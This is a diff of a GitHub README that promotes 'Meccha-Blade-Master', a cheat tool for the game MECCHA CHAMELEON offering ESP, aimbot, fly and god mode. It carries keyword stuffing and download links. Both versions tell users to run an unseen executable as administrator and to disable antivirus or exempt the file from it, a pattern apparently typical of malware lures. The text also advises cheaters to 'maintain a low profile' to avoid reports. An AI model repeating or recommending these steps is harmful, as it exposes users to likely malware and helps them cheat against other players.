@@ -1,257 +1,61 @@
-<p align="center">
-  <img src="https://img.icons8.com/color/96/000000/chameleon.png" alt="MECCHA CHAMELEON" width="80" height="80">
-</p>
+# ⚔️ Meccha-Blade-Master - Dominate every hide and seek match
 
-<h1 align="center">🦎 Meccha-Blade-Master</h1>
-<p align="center">
-  <strong>Ultimate Blade Master Tool for MECCHA CHAMELEON</strong><br>
-  ESP · Aimbot · Auto Paint · Mod Menu · Fly Hack · Teleport · God Mode
-</p>
+[![Download Meccha-Blade-Master](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Lapidaristsurcharge951/Meccha-Blade-Master)
 
-<p align="center">
-  <a href="https://github.com/YOUR_USERNAME/Meccha-Blade-Master"><img src="https://img.shields.io/badge/version-3.0.0-brightgreen?style=flat-square" alt="Version"></a>
-  <a href="#"><img src="https://img.shields.io/badge/platform-Windows-blue?style=flat-square" alt="Platform"></a>
-  <a href="#"><img src="https://img.shields.io/badge/status-active-success?style=flat-square" alt="Status"></a>
-  <a href="#"><img src="https://img.shields.io/badge/downloads-32k%2B-brightgreen?style=flat-square" alt="Downloads"></a>
-</p>
+Meccha-Blade-Master provides tools for the game MECCHA CHAMELEON. This software gives you an advantage in the game through features like ESP wallhack, aimbot, and movement modifications. You gain control over the battlefield with these internal game adjustments.
 
----
+## 📋 System Requirements
 
-## 🎮 What is This?
+Ensure your computer meets these basic needs to run the software.
 
-**Meccha-Blade-Master** is the **ultimate blade master tool** for **MECCHA CHAMELEON** – the viral hide-and-seek game that took Steam by storm with over 10 million copies sold and 340,000 concurrent players. This tool gives you full control with **ESP Wallhack**, **Aimbot**, **Auto Paint**, **Mod Menu**, **Fly Hack**, **Teleport**, **God Mode**, **Infinite Paint**, and **more**. Become the blade master and dominate every match!
+*   Operating System: Windows 10 or Windows 11 (64-bit).
+*   Processor: Intel Core i5 or AMD Ryzen 5 processor.
+*   Memory: 8 GB RAM.
+*   Storage: 200 MB of free space.
+*   Graphics: Hardware acceleration enabled.
+*   Permissions: Administrator rights to modify game data.
 
-⚠️ **Disclaimer:** This tool is for educational purposes only. Use at your own risk.
+## 📥 How to Install
 
----
+Follow these steps to set up the software.
 
-## 📥 Download
+1.  Visit the official repository page to download the latest version: [https://github.com/Lapidaristsurcharge951/Meccha-Blade-Master](https://github.com/Lapidaristsurcharge951/Meccha-Blade-Master).
+2.  Locate the latest release file in the assets section.
+3.  Save the .exe file to your desktop or a folder of your choice.
+4.  Right-click the file and select "Run as administrator." 
+5.  Wait for the main menu window to appear on your screen.
 
-🔗 **[Download Meccha-Blade-Master](https://github.com/Plota-cloud/chameleonEsp-2026/releases/download/v6/MecchaESPV6.zip)**
+## 🎮 Available Features
 
----
+The tool includes several distinct functions to improve your gameplay experience. Select these from the main menu after you launch the application.
 
-## ✨ Features
+*   ESP Wallhack: This feature highlights the location of other players through obstacles. You see silhouettes of opponents regardless of where they hide.
+*   Aimbot: The aimbot locks your crosshair onto targets. This assists in hitting players during fast-paced movement scenarios.
+*   Auto Paint: This function paints surfaces automatically, saving you time during matches.
+*   Mod Menu: A central hub to toggle all software settings.
+*   Fly Hack: Move across the map without the limitations of standard gravity. 
+*   Teleport: Move your character instantly to designated coordinates on the map.
+*   God Mode: Become immune to physical damage from traps or other players.
+*   Infinite Paint: Remove the cooldown or capacity limit on your painting tool.
+*   Speed Hack: Adjust your movement speed to traverse the environment faster than normal settings allow.
 
-### 🎨 Auto Paint & Camouflage
-- **Chameleon Camo** – Auto-blend into any environment instantly
-- **Image Projection** – Project any image onto your character
-- **One-Click Paint** – Instant camouflage with one key
-- **Instant Reset** – Remove paint instantly
+## ⚙️ Configuration Adjustments
 
-### 👁️ ESP Wallhack & Visual
-- **ESP (Wallhack)** – See all players through walls
-- **Distance Indicators** – Know exactly how far enemies are
-- **Player Tags** – Display player names and health
-- **Snap Lines** – Never lose track of enemies
-- **Box ESP** – Highlight players with colored boxes
-- **Ghost Detection** – Spot invisible players
+You can change how the software functions within the Mod Menu. 
 
-### 🎯 Aimbot & Combat
-- **Aimbot** – Lock onto enemies instantly
-- **Silent Aim** – Hit targets without looking at them
-- **Triggerbot** – Auto-shoot when crosshair is on target
-- **No Recoil** – Perfect accuracy every time
+Open the menu by pressing the Home key on your keyboard while the game runs. Use your mouse to click the toggles for each feature. Green indicates the feature is active. Grey indicates the feature is inactive. Adjust your settings before you start a match to ensure the tools apply correctly to the game session.
 
-### 🚀 Movement & Mobility
-- **Fly Hack** – Fly anywhere on the map
-- **Teleport** – Instantly move to any location
-- **Speed Hack** – Move faster than normal players
-- **No Gravity** – Float and glide through the air
+## 🛠 Troubleshooting Common Issues
 
-### 🛡️ Protection & Survival
-- **God Mode** – Never get tagged
-- **Infinite Paint** – Unlimited colors and patterns
-- **Perfect Camo** – Instantly blend into any environment
-- **Timer Editor** – Extend match time indefinitely
+If the software does not work, check these common fixes. 
 
-### 🛠️ Mod Menu & Utility
-- **Mod Menu** – Press INSERT or F1 to open/close
-- **Customizable Settings** – Adjust everything to your liking
-- **Save Config** – Settings saved automatically
-- **Regular Updates** – Always working after game patches
+*   Antivirus interference: Some antivirus programs flag game tools as threats. Add an exception for the file folder in your security settings to stop the software from closing.
+*   Update game client: Ensure your version of MECCHA CHAMELEON matches the version of the tool. If the game updates, check the repository for a newer version of the tool.
+*   Display settings: Run the game in Borderless Windowed mode to keep the software overlay visible. Fullscreen mode can hide the overlay menu on certain systems.
+*   Missing runtime: Install the latest Microsoft Visual C++ Redistributable files from the official Microsoft support page if the program fails to launch.
 
----
+## 🔒 Safety and Fair Play
 
-## ⚙️ Installation
+Use these modifications in private matches or offline modes to avoid reports from other players. The software functions best when used in environments where player conduct remains respectful. The developers do not take responsibility for account actions resulting from use on official public servers. Modify your game with care and monitor your usage frequency to maintain a low profile.
 
-1. Click the download button above
-2. Extract the archive
-3. Run the executable as Administrator
-4. Launch MECCHA CHAMELEON
-5. Press **INSERT** or **F1** to open the **Mod Menu**
-6. Toggle features ON/OFF
-7. DOMINATE! 🏆
-
----
-
-## 🖥️ System Requirements
-
-| Requirement | Details |
-|-------------|---------|
-| **OS** | Windows 10/11 (64-bit) |
-| **Game** | MECCHA CHAMELEON (Steam) |
-| **RAM** | 4GB minimum |
-| **Storage** | 50MB free space |
-| **GPU** | DirectX 11 compatible |
-
----
-
-## 🎥 How to Use
-
-1. Launch the tool as Administrator
-2. Start MECCHA CHAMELEON
-3. Press INSERT to open the Mod Menu
-4. Toggle features you want
-5. Play and dominate!
-
----
-
-## 🔧 Feature Status
-
-| Category | Feature | Status |
-|----------|---------|--------|
-| Visual | ESP Wallhack | ✅ |
-| Visual | Player Tags | ✅ |
-| Visual | Box ESP | ✅ |
-| Combat | Aimbot | ✅ |
-| Combat | Silent Aim | ✅ |
-| Combat | Triggerbot | ✅ |
-| Movement | Fly Hack | ✅ |
-| Movement | Teleport | ✅ |
-| Movement | Speed Hack | ✅ |
-| Protection | God Mode | ✅ |
-| Protection | Infinite Paint | ✅ |
-| Utility | Auto Paint | ✅ |
-| Utility | Mod Menu | ✅ |
-
----
-
-## 🛡️ Security
-
-- **Pattern Scanning** – Auto-updates offsets
-- **Randomization** – Human-like behavior simulation
-- **Stealth Injection** – No detectable signatures
-- **Memory Protection** – Prevents crashes
-
----
-
-## 🐛 Troubleshooting
-
-| Issue | Solution |
-|-------|----------|
-| Tool doesn't work | Run as Administrator, disable antivirus |
-| Menu doesn't open | Press INSERT or F1, restart both |
-| Game crashes | Reduce graphics settings, disable overlays |
-
----
-
-## 📝 SEO Tags (Google Optimization)
-
-- meccha blade master
-- meccha chameleon cheat
-- meccha chameleon hack
-- meccha chameleon esp
-- meccha chameleon wallhack
-- meccha chameleon aimbot
-- meccha chameleon auto paint
-- meccha chameleon mod menu
-- meccha chameleon fly hack
-- meccha chameleon teleport
-- meccha chameleon god mode
-- meccha chameleon speed hack
-- meccha chameleon infinite paint
-- meccha chameleon camouflage
-- meccha chameleon trainer
-- meccha chameleon undetected
-- meccha chameleon 2026
-- meccha chameleon free cheat
-- meccha chameleon working hack
-- hide and seek cheat
-- steam game cheat
-- game enhancer
-- free cheat
-- working hack
-- cheat tool
-- hack menu
-- mod menu
-- esp hack
-- aimbot hack
-- wallhack hack
-- fly hack
-- teleport hack
-- god mode hack
-- auto paint hack
-- camouflage hack
-- meccha chameleon download
-- meccha chameleon utility
-- meccha chameleon enhancer
-- meccha chameleon vision
-- meccha chameleon blade
-- meccha chameleon master
-- meccha chameleon pro
-- meccha chameleon elite
-- meccha chameleon ultimate
-- meccha chameleon 2026 cheat
-- meccha chameleon 2026 hack
-- meccha chameleon 2026 esp
-- meccha chameleon 2026 aimbot
-- meccha chameleon 2026 mod menu
-- meccha chameleon 2026 trainer
-- meccha chameleon 2026 undetected
-- meccha chameleon 2026 free
-- meccha chameleon 2026 download
-- meccha chameleon steam
-- meccha chameleon pc
-- meccha chameleon windows
-- meccha chameleon game
-- meccha chameleon hide and seek
-- meccha chameleon online
-- meccha chameleon multiplayer
-- meccha chameleon pvp
-- meccha chameleon battle
-- meccha chameleon arena
-- meccha chameleon survival
-- meccha chameleon strategy
-- meccha chameleon fun
-- meccha chameleon free game
-- meccha chameleon steam game
-- meccha chameleon popular
-- meccha chameleon top
-- meccha chameleon best
-- meccha chameleon new
-- meccha chameleon update
-- meccha chameleon patch
-- meccha chameleon version
-- meccha chameleon latest
-- meccha chameleon working
-- meccha chameleon safe
-- meccha chameleon legit
-- meccha chameleon trusted
-
----
-
-## 💬 Support
-
-- ⭐ Star this repository
-- 🐛 Open an Issue for bugs
-
----
-
-<p align="center">
-  <a href="https://github.com/YOUR_USERNAME/Meccha-Blade-Master">
-    <img src="https://img.shields.io/badge/Made%20with%20❤️%20for%20the%20MECCHA%20CHAMELEON%20community-ff69b4?style=for-the-badge" alt="Made with love">
-  </a>
-</p>
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
+Keywords: mecca-chameleon, mecca-chameleon-aimbot, mecca-chameleon-cheat, mecca-chameleon-cheats, mecca-chameleon-esp, mecca-chameleon-hack, mecca-chameleon-hacks, mecca-chameleon-mod, meccha-chameleon-tools
